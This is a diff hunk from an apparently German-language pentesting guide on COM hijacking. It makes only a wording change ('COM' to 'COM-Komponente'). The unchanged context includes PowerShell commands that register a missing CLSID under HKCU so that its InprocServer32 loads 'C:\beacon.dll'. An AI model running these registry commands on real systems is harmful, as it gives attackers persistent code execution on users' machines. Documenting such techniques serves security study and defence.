@@ -10,7 +10,7 @@ Da die Werte von HKCU von den Benutzern geändert werden können, könnte **COM 
 - wo das _Ergebnis_ **NAME NOT FOUND** ist.
 - und der _Pfad_ mit **InprocServer32** endet.
 
-Sobald Sie entschieden haben, welche nicht existierende COM Sie nachahmen möchten, führen Sie die folgenden Befehle aus. _Seien Sie vorsichtig, wenn Sie sich entscheiden, eine COM nachzuahmen, die alle paar Sekunden geladen wird, da dies übertrieben sein könnte._
+Sobald Sie entschieden haben, welche nicht existierende COM-Komponente Sie nachahmen möchten, führen Sie die folgenden Befehle aus. _Seien Sie vorsichtig, wenn Sie sich entscheiden, eine COM-Komponente nachzuahmen, die alle paar Sekunden geladen wird, da dies übertrieben sein könnte._
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
